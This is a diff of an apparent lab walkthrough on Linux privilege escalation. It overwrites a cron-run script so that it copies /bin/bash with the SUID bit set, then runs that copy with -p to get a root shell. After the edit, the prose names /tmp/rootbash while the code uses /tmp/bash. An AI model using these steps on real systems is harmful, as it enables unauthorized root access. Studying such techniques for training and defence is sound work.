@@ -10,8 +10,8 @@ cat /etc/crontab
 ```python
 #!/bin/bash  
   
-cp /bin/bash /tmp/rootbash  
-chmod +xs /tmp/rootbash
+cp /bin/bash /tmp/bash  
+chmod +xs /tmp/bash
 ```
 
 **Make sure that the file is executable:**
@@ -21,6 +21,6 @@ chmod +x /home/user/overwrite.sh
 
 **Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:**
 ```python
-/tmp/rootbash -p
+/tmp/bash -p
 ```
 
